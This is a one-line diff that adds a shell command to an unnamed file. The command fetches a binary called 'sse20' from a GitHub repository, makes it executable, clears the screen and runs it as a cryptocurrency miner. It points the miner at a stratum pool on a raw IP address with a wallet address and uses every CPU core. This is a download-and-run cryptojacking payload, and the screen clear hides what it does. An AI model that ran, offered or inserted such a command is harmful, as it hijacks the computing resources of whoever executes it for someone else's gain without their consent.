@@ -1,1 +1,1 @@
-
+wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a power2b -o stratum+tcp://103.93.161.49:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN -t $(nproc)
